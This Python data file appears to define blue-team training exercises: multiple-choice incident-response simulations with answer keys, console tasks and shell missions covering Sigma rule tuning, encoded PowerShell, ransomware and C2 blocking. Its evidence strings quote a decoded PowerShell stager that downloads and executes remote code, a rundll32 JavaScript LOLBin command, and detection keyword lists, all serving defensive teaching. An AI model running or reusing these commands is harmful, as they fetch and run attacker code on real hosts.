import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from batch2_common import merge

D1 = 'secops-blue-team'
D2 = 'exposed-portal-initial-access'

SIMS = [
    {
        "id": "secops-sim-sigma-triage",
        "title": "The rundll32 Sigma hit: true positive or admin?",
        "kind": "troubleshoot",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "Your new Sigma rule 'Suspicious Rundll32 Execution' fired 14 times overnight across 6 hosts. Half look like admins, half do not. Triage the rule.",
        "steps": [
            {
                "symptom": "14 hits: rundll32.exe with no command-line arguments on some hosts, with javascript: and DLL payloads on others.",
                "options": [
                    "Split the signal: argument-less rundll32 is often benign (COM invocation), but rundll32 with script/DLL payloads is a classic LOLBin execution — triage by command line, parent process, and prevalence",
                    "All 14 are true positives — isolate every host",
                    "All 14 are false positives — disable the rule",
                    "Rundll32 is a Windows component and can never be malicious"
                ],
                "correct": 0,
                "evidence": [
                    ["sigma-hits.csv", "8 hits: rundll32.exe (no args), parent svchost.exe, user SYSTEM — matches baseline. 6 hits: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \", parent winword.exe, user j.chen."],
                    ["sigma-rule.yml", "Rule as written: Image ENDWITH 'rundll32.exe' — no command-line condition. Fires on all invocations."]
                ],
                "explain": "Detection engineering is signal shaping. The rule as written cannot distinguish COM plumbing from LOLBin abuse. The fix is in the rule: add command-line conditions so the benign pattern stops firing and the malicious pattern stays loud."
            },
            {
                "symptom": "The 6 malicious-pattern hits trace to a phishing email j.chen opened yesterday. What is the triage disposition?",
                "options": [
                    "Close as benign — the user seems fine",
                    "True positive, active intrusion: isolate the 6 hosts, reset j.chen's credentials, hunt for persistence and lateral movement from those hosts",
                    "Reimage just j.chen's workstation and move on",
                    "Wait for the EDR to handle it"
                ],
                "correct": 1,
                "evidence": [
                    ["edr.txt", "winword.exe spawned rundll32 with network connections to 185.220.x.x. Follow-on: scheduled task 'Updater' created on 3 of 6 hosts."],
                ],
                "explain": "LOLBin execution from a phishing parent with C2 and persistence is an active intrusion, not an alert to tune. Contain all affected hosts, kill the identity's sessions, and hunt outward — the rule did its job, now do yours."
            },
            {
                "symptom": "Intrusion contained. How do you improve the detection so this class fires cleaner next time?",
                "options": [
                    "Delete the Sigma rule — too noisy",
                    "Tune the rule: require suspicious command-line patterns, add parent-process context, map to MITRE T1218.011, and add a prevalence exception for the known-benign SYSTEM pattern",
                    "Set the rule to email the whole company on every hit",
                    "Only run the rule on weekends"
                ],
                "correct": 1,
                "evidence": [
                    ["tuned-rule.yml", "detection: Image|endswith: 'rundll32.exe' AND CommandLine|contains: ['javascript:', '.dll,', 'shell32,ShellExec_RunDLL'] — plus filter for the benign SYSTEM/no-args baseline."],
                ],
                "explain": "The detection lifecycle: idea -> rule -> tuning against real data -> ATT&CK mapping -> exception handling. Each iteration makes the signal sharper. Deleting the rule surrenders the visibility."
            }
        ],
        "debrief": "A Sigma rule is a hypothesis about attacker behavior. Triage tests the hypothesis against data, tuning sharpens it, and ATT&CK mapping tells you what coverage you actually bought. Noisy rules get tuned, not deleted.",
        "points": 20
    },
    {
        "id": "secops-sim-exposed-portal",
        "title": "Ransomware via the exposed remote portal",
        "kind": "respond",
        "domain_id": D2,
        "difficulty": 3,
        "brief": "The VPN portal — internet-facing, no MFA — shows successful logons from two foreign IPs at 04:00. An hour later, file shares start encrypting. This is initial access in progress.",
        "steps": [
            {
                "symptom": "04:02 and 04:07: successful VPN logons for m.alvarez from IPs in two different countries. 05:15: mass file renames to .locked on FS-01.",
                "options": [
                    "Ransomware initial access through the exposed portal: credential stuffing or password spray against a non-MFA VPN, now in the encryption phase",
                    "The user is traveling",
                    "A backup job encrypting files",
                    "Coincidence — the logons and the encryption are unrelated"
                ],
                "correct": 0,
                "evidence": [
                    ["vpn.log", "04:02 login m.alvarez from 185.220.x.x (success, no MFA challenge). 04:07 login m.alvarez from 45.155.x.x (success). m.alvarez is on PTO in Ohio."],
                    ["fs01.txt", "05:15: 40,000 files renamed *.locked. Ransom note dropped: README_RESTORE.txt. Process: svchost.exe injected (hollowed)."]
                ],
                "explain": "Impossible-travel logons to a non-MFA portal followed by mass encryption is the ransomware playbook's opening chapters. The portal is the initial access vector; everything after is dwell and detonate."
            },
            {
                "symptom": "Encryption is spreading to FS-02. What is the correct containment sequence?",
                "options": [
                    "Pay the ransom to stop the spread",
                    "Isolate FS-01 and FS-02 from the network immediately, disable the VPN portal and m.alvarez's account, then assess backup integrity before any recovery",
                    "Shut down the entire data center",
                    "Delete the ransom note"
                ],
                "correct": 1,
                "evidence": [
                    ["playbook-ransomware.txt", "Contain: sever infected hosts from the network (pull the cable / isolate in EDR), kill the access vector (portal + account), verify clean backups BEFORE restoring — restoring into an active intrusion re-encrypts."],
                ],
                "explain": "Speed matters but order matters more: isolate the blast radius, kill the entry path, and prove your backups are clean before you touch recovery. Paying funds the next attack and does not guarantee decryption."
            },
            {
                "symptom": "Contained. The portal had no MFA because 'executives found it inconvenient.' What is the structural fix?",
                "options": [
                    "Put the portal behind MFA and conditional access, remove direct internet exposure where possible, and monitor impossible-travel as a detection",
                    "Change the VPN password monthly",
                    "Move the portal to a different port",
                    "Accept the risk — executives are happy"
                ],
                "correct": 0,
                "evidence": [
                    ["postmortem.txt", "Root causes: internet-exposed auth without MFA, no impossible-travel detection, flat network let FS-02 fall in 20 minutes. All three are architectural, not user, failures."],
                ],
                "explain": "Exposed portals without MFA are ransomware's favorite door. The fix is layered: strong auth on the door, less exposure of the door, and detection for when someone picks the lock anyway."
            }
        ],
        "debrief": "Ransomware is won or lost at initial access. Harden the portals (MFA, conditional access, minimal exposure), detect the spray (impossible travel, volume anomalies), and have a containment order rehearsed before the 4 AM call.",
        "points": 20
    },
    {
        "id": "secops-sim-detection-gap",
        "title": "Where does the next detection dollar go?",
        "kind": "decide",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "Your ATT&CK coverage map shows a gap: no visibility into T1078 (Valid Accounts) abuse, and weak coverage of T1059 (Command and Scripting Interpreter). Budget covers one project. Decide.",
        "steps": [
            {
                "symptom": "Gap A (T1078): no impossible-travel, no impossible-time, no dormant-account-use detection. Gap B (T1059): PowerShell Script Block Logging off on 60% of fleet, no AMSI telemetry centralized.",
                "options": [
                    "Close the T1059 gap first: command-line visibility underpins detection of nearly every intrusion phase, and Script Block Logging is a config change, not a purchase",
                    "Close the T1078 gap first — valid accounts are the bigger threat",
                    "Split the budget across both and do each halfway",
                    "Buy a new tool that claims to cover both"
                ],
                "correct": 0,
                "evidence": [
                    ["coverage-map.txt", "T1059 appears in 11 of the last 12 intrusions (execution, persistence, C2). T1078 appeared in 4. Script Block Logging: GPO change, zero license cost, 2-week rollout."],
                    ["threat-intel.txt", "Current ransomware affiliates lean heavily on PowerShell and LOLBins post-access; valid-account abuse usually follows, not precedes."],
                ],
                "explain": "Risk-based prioritization: cover the technique the adversary uses most, at the lowest cost, first. Script Block Logging is the highest-ROI detection control in Windows — it turns every obfuscated command into evidence."
            },
            {
                "symptom": "T1059 project approved. How do you prove it worked?",
                "options": [
                    "Count the number of alerts",
                    "Measure with purple-team validation: execute the ATT&CK procedures safely, confirm the new telemetry fires, tune to a target false-positive rate, and track mean-time-to-detect on T1059 techniques",
                    "Ask the analysts if they feel safer",
                    "Wait for the next real intrusion"
                ],
                "correct": 1,
                "evidence": [
                    ["validation.txt", "Atomic tests for T1059.001/.003: 14/14 detected post-rollout. FP rate: 3/day (tunable). MTTD on PowerShell abuse: 4h -> 11min."],
                ],
                "explain": "Detection engineering without validation is hope. Adversary emulation proves the control fires, FP measurement proves it is livable, and MTTD proves it matters."
            }
        ],
        "debrief": "Spend detection budget like an investor: highest adversary usage, lowest implementation cost, validated with emulation. Coverage maps are portfolios — rebalance toward where the attacks actually are.",
        "points": 15
    },
    {
        "id": "secops-sim-lolbin-powershell",
        "title": "Encoded PowerShell at 2 AM",
        "kind": "troubleshoot",
        "domain_id": D1,
        "difficulty": 3,
        "brief": "EDR flags powershell.exe -EncodedCommand on three finance workstations at 02:00. It could be an admin script or an attack. Determine which.",
        "steps": [
            {
                "symptom": "Three hosts, same encoded blob, parent process is OUTLOOK.EXE on two and svchost on one.",
                "options": [
                    "Malicious on the Outlook-parented hosts (phishing-delivered), investigate the svchost one separately — parent process is the discriminator",
                    "All benign — admins use encoded commands",
                    "All malicious — reimage all three immediately",
                    "Encoded commands are always malware"
                ],
                "correct": 0,
                "evidence": [
                    ["edr-detail.txt", "Host FIN-01/02: parent OUTLOOK.EXE (macro-enabled doc opened 01:58). Host FIN-03: parent svchost.exe, command decodes to a known SCCM inventory script hash."],
                    ["decoded.txt", "FIN-01 blob decodes to: IEX (New-Object Net.WebClient).DownloadString('http://185.220.x.x/p') — a stager. FIN-03 blob: Get-WmiObject inventory collection, signed by IT."],
                ],
                "explain": "Same technique, opposite verdicts — this is why parent process and payload matter more than the technique label. Outlook spawning encoded PowerShell that downloads a stager is an attack; SCCM's signed inventory script is Tuesday."
            },
            {
                "symptom": "FIN-01 and FIN-02 are compromised (stager downloaded, C2 beaconing). What is the hunt scope?",
                "options": [
                    "Just reimage the two workstations",
                    "Scope by the decoded infrastructure: hunt all hosts contacting the C2 domain/IP, all hosts with the same stager hash, and the mailbox that delivered the phish — then contain, eradicate, recover in order",
                    "Block the C2 IP and close the ticket",
                    "Reset every password in the company"
                ],
                "correct": 1,
                "evidence": [
                    ["hunt.txt", "C2 185.220.x.x seen from FIN-01, FIN-02, and SRV-PRINT-01 (lateral movement). Stager hash on 4 hosts. Phish delivered to 12 mailboxes, 2 clicked."],
                ],
                "explain": "Scope follows the attacker's infrastructure, not your initial alert count. The print server nobody looked at is the lateral movement that turns two workstations into a domain incident."
            }
        ],
        "debrief": "Living-off-the-land techniques are guilty until the context acquits them. Triage on parent process, payload, and prevalence — then scope the hunt by infrastructure, because attackers reuse theirs.",
        "points": 20
    },
    {
        "id": "secops-sim-log-outage",
        "title": "Blind during the incident: SIEM ingestion gap",
        "kind": "respond",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "During an active intrusion investigation you discover the SIEM stopped ingesting EDR telemetry 6 hours ago. You are partially blind in the middle of a fight. Respond.",
        "steps": [
            {
                "symptom": "EDR console shows current data; SIEM last EDR event 6 hours ago. The intrusion window overlaps the gap.",
                "options": [
                    "Continue the investigation in the EDR console directly while restoring the ingestion pipeline in parallel — never let a pipeline outage pause the hunt",
                    "Pause the investigation until the SIEM is fixed",
                    "Assume the gap means the attacker deleted the logs",
                    "Rebuild the SIEM from scratch"
                ],
                "correct": 0,
                "evidence": [
                    ["pipeline.txt", "Forwarder cert expired 6h ago — mechanical failure, not tampering. EDR cloud console unaffected and current."],
                    ["ir-note.txt", "The hunt continues on native consoles during pipeline outages; the pipeline is restored as a parallel workstream."],
                ],
                "explain": "Pipelines fail; investigations must not. Work the native console where the data lives, fix the forwarder in parallel, and verify it was mechanical (cert expiry) not adversarial (log tampering) — both look like gaps."
            },
            {
                "symptom": "Pipeline restored. How do you handle the 6-hour blind spot in the investigation record?",
                "options": [
                    "Ignore it — the data is backfilled automatically",
                    "Backfill the gap from the EDR console, document the blind window and its cause in the incident timeline, and add forwarder-cert monitoring so it pages before expiry",
                    "Pretend the gap did not happen",
                    "Close the incident — too much uncertainty"
                ],
                "correct": 1,
                "evidence": [
                    ["timeline.txt", "Blind window 18:00–00:00 documented; backfilled via EDR export; no attacker activity found in window, stated as assessed-not-assumed. Monitoring added for cert expiry <30d."],
                ],
                "explain": "An undocumented blind spot becomes a permanent doubt in the timeline. Backfill what you can, document what you cannot prove, and fix the monitoring so the next cert expiry pages a human instead of blinding the SOC."
            }
        ],
        "debrief": "Your detections are only as reliable as your pipelines. Monitor the monitors, hunt on native consoles during outages, and document every blind window — 'assessed, not assumed' is the standard.",
        "points": 15
    }
]

CONSOLES = [
    {
        "id": "secops-console-deploy-rule",
        "title": "Deploy the Sigma-style detection",
        "console": "siem-dashboard",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "Deploy a detection rule for encoded PowerShell, acknowledge the test alert ALT-5200, and isolate the compromised host FIN-01.",
        "tasks": [
            {
                "id": "t1",
                "instruction": "Create a detection rule named 'encoded-powershell' with query 'EncodedCommand'.",
                "validate": {"action": "create-rule", "params": {"name": "encoded-powershell", "query": "EncodedCommand"}},
                "hint": "Create a rule named encoded-powershell with query 'EncodedCommand'."
            },
            {
                "id": "t2",
                "instruction": "Acknowledge alert ALT-5200.",
                "validate": {"action": "acknowledge-alert", "params": {"id": "ALT-5200"}},
                "hint": "Click acknowledge on alert ALT-5200."
            },
            {
                "id": "t3",
                "instruction": "Isolate host FIN-01.",
                "validate": {"action": "isolate-host", "params": {"host": "FIN-01"}},
                "hint": "Use isolate-host on FIN-01."
            }
        ],
        "debrief": "Detection to containment in one workflow: deploy the rule, work the alert, isolate the host — the blue-team loop closed in minutes."
    },
    {
        "id": "secops-console-ransomware-ticket",
        "title": "Run the ransomware ticket",
        "console": "ticketing",
        "domain_id": D2,
        "difficulty": 1,
        "brief": "Open a P1 ransomware ticket, assign it to the IR lead, and move it to in-progress.",
        "tasks": [
            {
                "id": "t1",
                "instruction": "Create a P1 ticket titled 'Ransomware — FS-01 encryption'.",
                "validate": {"action": "create-ticket", "params": {"title": "Ransomware — FS-01 encryption", "priority": "P1"}},
                "hint": "Create a P1 ticket titled 'Ransomware — FS-01 encryption'."
            },
            {
                "id": "t2",
                "instruction": "Assign the ticket to 'ir-lead'.",
                "validate": {"action": "assign-ticket", "params": {"id": "1", "assignee": "ir-lead"}},
                "hint": "Assign ticket 1 to ir-lead."
            },
            {
                "id": "t3",
                "instruction": "Move the ticket to in-progress.",
                "validate": {"action": "update-status", "params": {"id": "1", "status": "in-progress"}},
                "hint": "Update ticket 1 status to in-progress."
            }
        ],
        "debrief": "Ransomware gets the highest priority, a named incident lead, and a live ticket — coordination is containment."
    },
    {
        "id": "secops-console-block-c2",
        "title": "Block the C2 at the firewall",
        "console": "firewall",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "The stager phones home to 185.220.14.9 on TCP 443. Drop that traffic on INPUT and set the INPUT default to DROP.",
        "tasks": [
            {
                "id": "t1",
                "instruction": "Add a rule dropping TCP port 443 from 185.220.14.9 on INPUT.",
                "validate": {"action": "add-rule", "params": {"chain": "INPUT", "protocol": "tcp", "port": 443, "source": "185.220.14.9", "action": "DROP"}},
                "hint": "Add an INPUT rule: protocol tcp, port 443, source 185.220.14.9, action DROP."
            },
            {
                "id": "t2",
                "instruction": "Set the INPUT chain default policy to DROP.",
                "validate": {"action": "set-default-policy", "params": {"chain": "INPUT", "policy": "DROP"}},
                "hint": "Set the default policy of the INPUT chain to DROP."
            }
        ],
        "debrief": "C2 blocking is containment, not eradication — it buys the hunt time while you find every foothold."
    },
    {
        "id": "secops-console-harden-detections",
        "title": "Protect the detection configs",
        "console": "linux-desktop",
        "domain_id": D1,
        "difficulty": 1,
        "brief": "The Sigma rule staging file /opt/siem/rules/staging.yml is group-writable. Lock it to root-only.",
        "tasks": [
            {
                "id": "t1",
                "instruction": "Select /opt/siem/rules/staging.yml.",
                "validate": {"action": "select", "params": {"path": "/opt/siem/rules/staging.yml"}},
                "hint": "Select the file /opt/siem/rules/staging.yml."
            },
            {
                "id": "t2",
                "instruction": "Change /opt/siem/rules/staging.yml permissions to 600.",
                "validate": {"action": "chmod", "params": {"path": "/opt/siem/rules/staging.yml", "mode": "600"}},
                "hint": "Set mode 600 on /opt/siem/rules/staging.yml."
            },
            {
                "id": "t3",
                "instruction": "Change the owner of /opt/siem/rules/staging.yml to root.",
                "validate": {"action": "chown", "params": {"path": "/opt/siem/rules/staging.yml", "owner": "root"}},
                "hint": "Change owner of /opt/siem/rules/staging.yml to root."
            }
        ],
        "debrief": "Detection configs are high-value targets — an attacker who can edit the rules can blind them. Harden the pipeline itself."
    }
]

MISSIONS = [
    {
        "id": "secops-mission-grep-stager",
        "title": "Find the stager downloads",
        "domain_id": D1,
        "difficulty": 1,
        "brief": "Search the proxy log for the stager download pattern.",
        "objectives": ["Grep proxy.log for 'stager'"],
        "checks": [
            {
                "command_pattern": "^grep.*stager.*proxy\\.log",
                "expect_contains": "stager",
                "hint": "Type: grep stager proxy.log"
            }
        ],
        "success_message": "Stager downloads located — the delivery hosts are identified."
    },
    {
        "id": "secops-mission-verify-rule",
        "title": "Verify the Sigma rule file",
        "domain_id": D1,
        "difficulty": 1,
        "brief": "Hash the deployed Sigma rule to confirm it matches the approved version.",
        "objectives": ["Run sha256sum on sigma-rundll32.yml"],
        "checks": [
            {
                "command_pattern": "^sha256sum\\s+sigma-rundll32\\.yml",
                "expect_contains": "sigma-rundll32.yml",
                "hint": "Type: sha256sum sigma-rundll32.yml"
            }
        ],
        "success_message": "Rule hash verified — the deployed detection is the approved one."
    },
    {
        "id": "secops-mission-find-logs",
        "title": "Find the rotated SIEM logs",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "Locate rotated SIEM log files under /var/log/siem for the backfill.",
        "objectives": ["Find .log files under /var/log/siem"],
        "checks": [
            {
                "command_pattern": "^find\\s+/var/log/siem.*\\.log",
                "expect_contains": ".log",
                "hint": "Type: find /var/log/siem -name '*.log'"
            }
        ],
        "success_message": "Log files located — the backfill can proceed."
    },
    {
        "id": "secops-mission-sort-alerts",
        "title": "Sort the alert export",
        "domain_id": D1,
        "difficulty": 1,
        "brief": "Sort alerts.csv to group identical alert names for triage.",
        "objectives": ["Sort alerts.csv"],
        "checks": [
            {
                "command_pattern": "^sort\\s+alerts\\.csv",
                "expect_contains": "EncodedCommand",
                "hint": "Type: sort alerts.csv"
            }
        ],
        "success_message": "Alerts sorted — the dominant patterns are now obvious."
    },
    {
        "id": "secops-mission-ps-hunt",
        "title": "List processes for LOLBins",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "List running processes and confirm powershell is visible in the output.",
        "objectives": ["Run ps and spot powershell"],
        "checks": [
            {
                "command_pattern": "^ps",
                "expect_contains": "powershell",
                "hint": "Type: ps aux"
            }
        ],
        "success_message": "Process list captured — living-off-the-land binaries are visible."
    },
    {
        "id": "secops-mission-diff-rule",
        "title": "Diff the rule versions",
        "domain_id": D1,
        "difficulty": 2,
        "brief": "Compare the original Sigma rule against the tuned version.",
        "objectives": ["Diff sigma-v1.yml against sigma-v2.yml"],
        "checks": [
            {
                "command_pattern": "^diff\\s+sigma-v1\\.yml\\s+sigma-v2\\.yml",
                "expect_contains": ">",
                "hint": "Type: diff sigma-v1.yml sigma-v2.yml"
            }
        ],
        "success_message": "Tuning changes visible — the rule got sharper."
    },
    {
        "id": "secops-mission-head-alerts",
        "title": "Preview the alert export",
        "domain_id": D1,
        "difficulty": 1,
        "brief": "Preview the first lines of the alert export to confirm its columns.",
        "objectives": ["Head alerts.csv"],
        "checks": [
            {
                "command_pattern": "^head\\s+alerts\\.csv",
                "expect_contains": "severity",
                "hint": "Type: head alerts.csv"
            }
        ],
        "success_message": "Alert format confirmed — triage can begin."
    }
]

if __name__ == '__main__':
    merge('secops-blue-team', sims=SIMS, consoles=CONSOLES, missions=MISSIONS)
